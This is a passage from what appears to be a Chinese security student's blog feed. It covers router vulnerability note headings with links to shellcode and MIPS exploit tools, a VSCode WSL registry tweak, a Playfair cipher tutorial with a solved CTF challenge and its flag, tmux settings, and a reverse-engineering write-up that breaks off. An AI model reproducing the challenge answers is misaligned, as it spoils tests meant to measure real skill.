href="#D-Link-DIR-645-路由器溢出漏洞分析" class="headerlink" title="D-Link DIR-645 路由器溢出漏洞分析"></a>D-Link DIR-645 路由器溢出漏洞分析</h2><p><a href="https://lantern.cool/CVE-d-link-dir-645/">D-Link DIR-645 路由器溢出漏洞分析 | Lantern’s 小站</a></p><h2 id="D-Link-DIR-505-便携路由器越界漏洞分析"><a href="#D-Link-DIR-505-便携路由器越界漏洞分析" class="headerlink" title="D-Link DIR-505 便携路由器越界漏洞分析"></a>D-Link DIR-505 便携路由器越界漏洞分析</h2><h2 id="Linksys-WRT54G-路由器溢出漏洞分析-——-运行环境修复"><a href="#Linksys-WRT54G-路由器溢出漏洞分析-——-运行环境修复" class="headerlink" title="Linksys WRT54G 路由器溢出漏洞分析 —— 运行环境修复"></a>Linksys WRT54G 路由器溢出漏洞分析 —— 运行环境修复</h2><h2 id="磊科全系列路由器后面漏洞分析"><a href="#磊科全系列路由器后面漏洞分析" class="headerlink" title="磊科全系列路由器后面漏洞分析"></a>磊科全系列路由器后面漏洞分析</h2><h2 id="参考文献及工具收集"><a href="#参考文献及工具收集" class="headerlink" title="参考文献及工具收集"></a>参考文献及工具收集</h2><p><a href="https://github.com/desword/shellcode_tools">desword/shellcode_tools: Useful tools for writing shellcode (github.com)</a></p><p><a href="https://github.com/ray-cp/MIPS">ray-cp/MIPS: mips exploit (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Book_Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VSCode(WSL) 添加至右键菜单</title>
      <link href="/else-vscode-wsl-add-to-right/"/>
      <url>/else-vscode-wsl-add-to-right/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul><li>实现右键可以直接在VSCode中使用WSL编辑文件</li></ul><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line"></span><br><span class="line">; 通过 Code(WSL) 打开</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\VSCode(WSL)]</span><br><span class="line">@=<span class="string">&quot;通过 Code(WSL) 打开&quot;</span></span><br><span class="line"><span class="string">&quot;Icon&quot;</span>=<span class="string">&quot;C:\\Users\\Lantern\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\VSCode(WSL)\command]</span><br><span class="line">@=<span class="string">&quot;wsl.exe code .&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\VSCode(WSL)]</span><br><span class="line">@=<span class="string">&quot;通过 Code(WSL) 打开&quot;</span></span><br><span class="line"><span class="string">&quot;Icon&quot;</span>=<span class="string">&quot;C:\\Users\\Lantern\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\VSCode(WSL)\command]</span><br><span class="line">@=<span class="string">&quot;wsl.exe code .&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\LibraryFolder\shell\VSCode(WSL)]</span><br><span class="line">@=<span class="string">&quot;通过 Code(WSL) 打开&quot;</span></span><br><span class="line"><span class="string">&quot;Icon&quot;</span>=<span class="string">&quot;C:\\Users\\Lantern\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\LibraryFolder\shell\VSCode(WSL)\command]</span><br><span class="line">@=<span class="string">&quot;wsl.exe code .&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Drive\shell\VSCode(WSL)]</span><br><span class="line">@=<span class="string">&quot;通过 Code(WSL) 打开&quot;</span></span><br><span class="line"><span class="string">&quot;Icon&quot;</span>=<span class="string">&quot;C:\\Users\\Lantern\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Drive\shell\VSCode(WSL)\command]</span><br><span class="line">@=<span class="string">&quot;wsl.exe code .&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\VSCode(WSL)]</span><br><span class="line">@=<span class="string">&quot;通过 Code(WSL) 打开&quot;</span></span><br><span class="line"><span class="string">&quot;Icon&quot;</span>=<span class="string">&quot;C:\\Users\\Lantern\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\VSCode(WSL)\command]</span><br><span class="line">@=<span class="string">&quot;wsl wslpath -u &quot;</span>%<span class="number">1</span><span class="string">&quot; |xargs code&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ELSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ELSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Playfair 密码</title>
      <link href="/note-crypto-playfair/"/>
      <url>/note-crypto-playfair/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>首发于公众号：<a href="https://mp.weixin.qq.com/s/iI7DUHShrjy8nB000t5TWg">深大信安Aurora</a></p><p>Playfair 密码（Playfair cipher or Playfair square）是一种对称式密码，是首种双字母取代的加密法。1854 年由英国人查尔斯 · 惠斯通（Charles Wheatstone）发明，惠斯登的朋友普莱费尔勋爵普及了这个加密法。基本算法如下：</p><ol><li>选取一串英文字母，除去重复出现的字母，将剩下的字母逐个逐个加入 5 × 5 的矩阵内，剩下的空间由未加入的英文字母依 A-Z 的顺序加入。注意，将 Q 去除，或将 I 和 J 视作同一字。</li><li>将要加密的明文分成两个一组。若组内的字母相同，将 X（或 Q）加到该组的第一个字母后，重新分组。若剩下一个字，也加入 X 。</li><li>在每组中，找出两个字母在矩阵中的地方。<ul><li>若两个字母不同行也不同列，在矩阵中找出另外两个字母（第一个字母对应行优先），使这四个字母成为一个长方形的四个角。</li><li>若两个字母同行，取这两个字母右方的字母（若字母在最右方则取最左方的字母）。</li><li>若两个字母同列，取这两个字母下方的字母（若字母在最下方则取最上方的字母）。</li></ul></li></ol><p>新找到的两个字母就是原本的两个字母加密的结果。</p><p>以 <code>playfair example</code>为密匙，得</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210303131559631.png"></p><p>要加密的讯息为 <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code>, 根据规则我们需要在某位补上一个<code>X</code>, 得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</span><br></pre></td></tr></table></figure><p>以<code>TH</code>为例，根据规则得到<code>ZB</code>，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210303131518712.png"></p><p>同理，按照加密规则就会得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZB XO TR BN CI QV SL QE RT IF KQ AD IU DM AY WF OV QG</span><br></pre></td></tr></table></figure><p>以下给出加解密脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Playfair</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.table = []</span><br><span class="line"></span><br><span class="line">        self.create_table(key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_table</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        letter_list = string.ascii_uppercase.replace(<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">        <span class="comment"># 格式化字符串</span></span><br><span class="line">        key = key.upper().replace(<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;I&#x27;</span>)  <span class="comment"># 将密钥变为大写, 且将I和J看为同一个字符</span></span><br><span class="line">        table = []  <span class="comment"># 加密表</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">            <span class="comment"># 过滤非字母 以及 去除重复字母 并加入加密表中</span></span><br><span class="line">            <span class="keyword">if</span> i.isalpha() <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> table:</span><br><span class="line">                table.append(i)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将a-z中不在加密表的字母加入</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> letter_list:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> table:</span><br><span class="line">                table.append(i)</span><br><span class="line">        <span class="comment"># 将加密表变为 5*5</span></span><br><span class="line">        self.table = [table[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_index</span>(<span class="params">self, ch</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> ch == self.table[i][j]:</span><br><span class="line">                    <span class="keyword">return</span> i, j</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, plaintext</span>):</span></span><br><span class="line">        plaintext = plaintext.upper().replace(<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;I&#x27;</span>)  <span class="comment"># 将明文变为大写, 且将I和J看为同一个字符</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 进行分组，如果相邻字母相同就在该组的第一个字母后加入X后重新分组, 如果第一个字母为X则加Q</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span>  <span class="comment"># 计算字母数</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> plaintext[i].isalpha():</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> i == <span class="built_in">len</span>(plaintext) - <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">sum</span> += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">while</span> <span class="keyword">not</span> plaintext[i+<span class="number">1</span>].isalpha() <span class="keyword">and</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> plaintext[i] == plaintext[i+<span class="number">1</span>]:</span><br><span class="line">                    ch = <span class="string">&#x27;X&#x27;</span> <span class="keyword">if</span> plaintext[i] != <span class="string">&#x27;X&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;Q&#x27;</span></span><br><span class="line">                    plaintext = plaintext[:i+<span class="number">1</span>] + ch + plaintext[i+<span class="number">1</span>:]</span><br><span class="line">                i += <span class="number">2</span></span><br><span class="line">                <span class="built_in">sum</span> += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果明文处理后为奇数就在最后加入X</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">sum</span> % <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> plaintext[i].isalpha():</span><br><span class="line">                    ch = <span class="string">&#x27;X&#x27;</span> <span class="keyword">if</span> plaintext[i] != <span class="string">&#x27;X&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;Q&#x27;</span></span><br><span class="line">                    plaintext += ch</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> plaintext[i].isalpha():</span><br><span class="line">                ciphertext += plaintext[i]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            x0, y0 = self.get_index(plaintext[i])</span><br><span class="line"></span><br><span class="line">            tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> plaintext[i+<span class="number">1</span>].isalpha() <span class="keyword">and</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">                tmp += plaintext[i+<span class="number">1</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            x1, y1 = self.get_index(plaintext[i + <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> x0 == x1:  <span class="comment"># 如果在同一行</span></span><br><span class="line">                ciphertext += self.table[x0][(y0 + <span class="number">1</span>) %</span><br><span class="line">                                             <span class="number">5</span>] + tmp + self.table[x1][(y1 + <span class="number">1</span>) % <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> y0 == y1:  <span class="comment"># 如果在同一列</span></span><br><span class="line">                ciphertext += self.table[(x0 + <span class="number">1</span>) %</span><br><span class="line">                                         <span class="number">5</span>][y0] + tmp + self.table[(x1 + <span class="number">1</span>) % <span class="number">5</span>][y1]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># 不同行不同列</span></span><br><span class="line">                ciphertext += self.table[x0][y1] + tmp + self.table[x1][y0]</span><br><span class="line"></span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, ciphertext</span>):</span></span><br><span class="line">        plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">        ciphertext = ciphertext.upper()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ciphertext:</span><br><span class="line">            <span class="built_in">sum</span> += <span class="number">1</span> <span class="keyword">if</span> i.isalpha() <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">sum</span> % <span class="number">2</span> == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(ciphertext):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ciphertext[i].isalpha():</span><br><span class="line">                plaintext += ciphertext[i]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            x0, y0 = self.get_index(ciphertext[i])</span><br><span class="line"></span><br><span class="line">            tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> ciphertext[i+<span class="number">1</span>].isalpha() <span class="keyword">and</span> i &lt; <span class="built_in">len</span>(ciphertext):</span><br><span class="line">                tmp += ciphertext[i+<span class="number">1</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            x1, y1 = self.get_index(ciphertext[i + <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> x0 == x1:  <span class="comment"># 如果在同一行</span></span><br><span class="line">                plaintext += self.table[x0][(y0 - <span class="number">1</span>) %</span><br><span class="line">                                            <span class="number">5</span>] + tmp + self.table[x1][(y1 - <span class="number">1</span>) % <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> y0 == y1:  <span class="comment"># 如果在同一列</span></span><br><span class="line">                plaintext += self.table[(x0 - <span class="number">1</span>) %</span><br><span class="line">                                        <span class="number">5</span>][y0] + tmp + self.table[(x1 - <span class="number">1</span>) % <span class="number">5</span>][y1]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># 不同行不同列</span></span><br><span class="line">                plaintext += self.table[x0][y1] + tmp + self.table[x1][y0]</span><br><span class="line"></span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = <span class="string">&quot;playfair example&quot;</span></span><br><span class="line">    plaintext = <span class="string">&quot;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&quot;</span></span><br><span class="line">    playfair = Playfair(key)</span><br><span class="line">    ciphertext = playfair.encrypt(plaintext)</span><br><span class="line">    <span class="built_in">print</span>(ciphertext) <span class="comment"># ZBX OTRBN CIQVS LQE RTIFK QADI UDM AYWF OVQG</span></span><br><span class="line">    plaintext = playfair.decrypt(ciphertext)</span><br><span class="line">    <span class="built_in">print</span>(plaintext) <span class="comment"># THE QUICK BROWN FOX IUMPS OVER THE LAZY DOGX</span></span><br></pre></td></tr></table></figure><h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>在不知道密钥的情况下，可以使用该GitHub项目所给的方法进行暴力破解，具体使用方法项目也说的比较清晰，这里不再赘述</p><p><a href="https://github.com/N8Stewart/PlayfairCrack">PlayfairCrack</a></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><strong>实验吧-密码学-Fair-Play</strong></p><ul><li><p>题目描述</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumps over the lazy dog!</span><br><span class="line">ihxo&#123;smzdodcikmodcismzd</span><br></pre></td></tr></table></figure></li><li><p>解题思路</p><ul><li><p>根据所给题目描述我们猜测<code>The quick brown fox jumps over the lazy dog!</code>就是所给密钥，我们用我们上述给的脚本直接进行解密，当然，要注意我们的脚本用的是大写，记得转换为小写即可</p></li><li><pre><code class="python">from Playfair import Playfairkey = &quot;The quick brown fox jumps over the lazy dog!&quot;ciphertext = &quot;ihxo&#123;smzdodcikmodcismzd&#125;&quot;playfair = Playfair(key)plaintext = playfair.decrypt(ciphertext)print(plaintext.lower())</code></pre></li><li><p>得到flag: <code>ctfx&#123;playfairisfairplay&#125;</code></p></li></ul></li></ul><h2 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h2><p><a href="https://github.com/N8Stewart/PlayfairCrack">PlayfairCrack</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tmux</title>
      <link href="/tool-tmux/"/>
      <url>/tool-tmux/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="Tmux"><a href="#Tmux" class="headerlink" title="Tmux"></a>Tmux</h2><p>Tmux是一种终端多路复用器:它允许在一个屏幕上创建、访问和控制多个终端。tmux可以从屏幕上分离并在后台继续运行，然后重新附加</p><p>详细教程可以看<a href="http://louiszhai.github.io/2017/09/30/tmux/#%E5%BC%80%E5%90%AF%E9%BC%A0%E6%A0%87%E6%94%AF%E6%8C%81">Tmux使用手册</a>, 这里只记录我一些配置以备忘</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Linux: <code>sudo apt install tmux</code></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>tmux的配置文件是 ~/.tmux.conf，这个文件可能不存在，你可以自己新建。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置前缀为Ctrl + a</span><br><span class="line">set -g prefix C-a</span><br><span class="line"></span><br><span class="line">#解除Ctrl+b 与前缀的对应关系</span><br><span class="line">unbind C-b</span><br></pre></td></tr></table></figure><p>对于tmux v2.1(2015.10.28)之前的版本，需加入如下配置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setw -g mode-mouse on # 支持鼠标选取文本等</span><br><span class="line">setw -g mouse-resize-pane on # 支持鼠标拖动调整面板的大小(通过拖动面板间的分割线)</span><br><span class="line">setw -g mouse-select-pane on # 支持鼠标选中并切换面板</span><br><span class="line">setw -g mouse-select-window on # 支持鼠标选中并切换窗口(通过点击状态栏窗口名称)</span><br></pre></td></tr></table></figure><p>有的地方可能会出现set-window-option的写法，setw就是它的别名。</p><p>对于tmux v2.1及以上的版本，仅需加入如下配置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set-option -g mouse on # 等同于以上4个指令的效果</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><blockquote><p>均需要先按<code>Ctrl + B</code></p></blockquote><ul><li><code>%</code>：左右分屏幕</li><li><code>&quot;</code>: 上下分屏</li><li><code>x</code>: 关闭终端</li></ul>]]></content>
      
      
      <categories>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ 题库练习</title>
      <link href="/wp-games-Jarvis-OJ/"/>
      <url>/wp-games-Jarvis-OJ/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="Findthekey"><a href="#Findthekey" class="headerlink" title="Findthekey"></a>Findthekey</h2><p>文件为pyc, 用<code>uncompyle6</code>进行反编译, 得到python源码如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.17 (default, Jul 20 2020, 15:37:01)</span></span><br><span class="line"><span class="comment"># [GCC 7.5.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: findkey</span></span><br><span class="line"><span class="comment"># Compiled at: 2016-04-30 17:54:18</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">lookup = [</span><br><span class="line"> <span class="number">196</span>, <span class="number">153</span>, <span class="number">149</span>, <span class="number">206</span>, <span class="number">17</span>, <span class="number">221</span>, <span class="number">10</span>, <span class="number">217</span>, <span class="number">167</span>, <span class="number">18</span>, <span class="number">36</span>, <span class="number">135</span>, <span class="number">103</span>, <span class="number">61</span>, <span class="number">111</span>, <span class="number">31</span>, <span class="number">92</span>, <span class="number">152</span>, <span class="number">21</span>, <span class="number">228</span>, <span class="number">105</span>, <span class="number">191</span>, <span class="number">173</span>, <span class="number">41</span>, <span class="number">2</span>, <span class="number">245</span>, <span class="number">23</span>, <span class="number">144</span>, <span class="number">1</span>, <span class="number">246</span>, <span class="number">89</span>, <span class="number">178</span>, <span class="number">182</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">85</span>, <span class="number">48</span>, <span class="number">226</span>, <span class="number">165</span>, <span class="number">241</span>, <span class="number">166</span>, <span class="number">214</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">151</span>, <span class="number">3</span>, <span class="number">109</span>, <span class="number">169</span>, <span class="number">150</span>, <span class="number">224</span>, <span class="number">69</span>, <span class="number">156</span>, <span class="number">158</span>, <span class="number">57</span>, <span class="number">181</span>, <span class="number">29</span>, <span class="number">200</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">252</span>, <span class="number">227</span>, <span class="number">93</span>, <span class="number">65</span>, <span class="number">82</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">170</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">177</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">202</span>, <span class="number">107</span>, <span class="number">25</span>, <span class="number">73</span>, <span class="number">148</span>, <span class="number">98</span>, <span class="number">129</span>, <span class="number">231</span>, <span class="number">212</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">174</span>, <span class="number">171</span>, <span class="number">64</span>, <span class="number">180</span>, <span class="number">233</span>, <span class="number">74</span>, <span class="number">140</span>, <span class="number">242</span>, <span class="number">75</span>, <span class="number">104</span>, <span class="number">253</span>, <span class="number">44</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">86</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">22</span>, <span class="number">55</span>, <span class="number">76</span>, <span class="number">35</span>, <span class="number">248</span>, <span class="number">96</span>, <span class="number">5</span>, <span class="number">56</span>, <span class="number">20</span>, <span class="number">161</span>, <span class="number">213</span>, <span class="number">238</span>, <span class="number">220</span>, <span class="number">72</span>, <span class="number">100</span>, <span class="number">247</span>, <span class="number">8</span>, <span class="number">63</span>, <span class="number">249</span>, <span class="number">145</span>, <span class="number">243</span>, <span class="number">155</span>, <span class="number">222</span>, <span class="number">122</span>, <span class="number">32</span>, <span class="number">43</span>, <span class="number">186</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">216</span>, <span class="number">126</span>, <span class="number">15</span>, <span class="number">42</span>, <span class="number">115</span>, <span class="number">138</span>, <span class="number">240</span>, <span class="number">147</span>, <span class="number">229</span>, <span class="number">204</span>, <span class="number">117</span>, <span class="number">223</span>, <span class="number">141</span>, <span class="number">159</span>, <span class="number">131</span>, <span class="number">232</span>, <span class="number">124</span>, <span class="number">254</span>, <span class="number">60</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">113</span>, <span class="number">79</span>, <span class="number">16</span>, <span class="number">128</span>, <span class="number">6</span>, <span class="number">251</span>, <span class="number">40</span>, <span class="number">205</span>, <span class="number">137</span>, <span class="number">199</span>, <span class="number">83</span>, <span class="number">54</span>, <span class="number">188</span>, <span class="number">19</span>, <span class="number">184</span>, <span class="number">201</span>, <span class="number">110</span>, <span class="number">255</span>, <span class="number">26</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">132</span>, <span class="number">160</span>, <span class="number">168</span>, <span class="number">154</span>, <span class="number">185</span>, <span class="number">183</span>, <span class="number">244</span>, <span class="number">78</span>, <span class="number">33</span>, <span class="number">123</span>, <span class="number">28</span>, <span class="number">59</span>, <span class="number">12</span>, <span class="number">210</span>, <span class="number">218</span>, <span class="number">47</span>, <span class="number">163</span>, <span class="number">215</span>, <span class="number">209</span>, <span class="number">108</span>, <span class="number">235</span>, <span class="number">237</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">24</span>, <span class="number">234</span>, <span class="number">106</span>, <span class="number">143</span>, <span class="number">88</span>, <span class="number">9</span>, <span class="number">136</span>, <span class="number">95</span>, <span class="number">30</span>, <span class="number">193</span>, <span class="number">176</span>, <span class="number">225</span>, <span class="number">198</span>, <span class="number">197</span>, <span class="number">194</span>, <span class="number">239</span>, <span class="number">134</span>, <span class="number">162</span>, <span class="number">192</span>, <span class="number">11</span>, <span class="number">70</span>, <span class="number">58</span>, <span class="number">187</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">236</span>, <span class="number">230</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">190</span>, <span class="number">208</span>, <span class="number">207</span>, <span class="number">7</span>, <span class="number">53</span>, <span class="number">219</span>, <span class="number">203</span>, <span class="number">62</span>, <span class="number">114</span>, <span class="number">127</span>, <span class="number">125</span>, <span class="number">164</span>, <span class="number">179</span>, <span class="number">175</span>, <span class="number">112</span>, <span class="number">172</span>, <span class="number">250</span>, <span class="number">133</span>, <span class="number">130</span>, <span class="number">52</span>, <span class="number">189</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">34</span>, <span class="number">157</span>, <span class="number">120</span>, <span class="number">195</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">142</span>, <span class="number">139</span>]</span><br><span class="line">pwda = [</span><br><span class="line"> <span class="number">188</span>, <span class="number">155</span>, <span class="number">11</span>, <span class="number">58</span>, <span class="number">251</span>, <span class="number">208</span>, <span class="number">204</span>, <span class="number">202</span>, <span class="number">150</span>, <span class="number">120</span>, <span class="number">206</span>, <span class="number">237</span>, <span class="number">114</span>, <span class="number">92</span>, <span class="number">126</span>, <span class="number">6</span>, <span class="number">42</span>]</span><br><span class="line">pwdb = 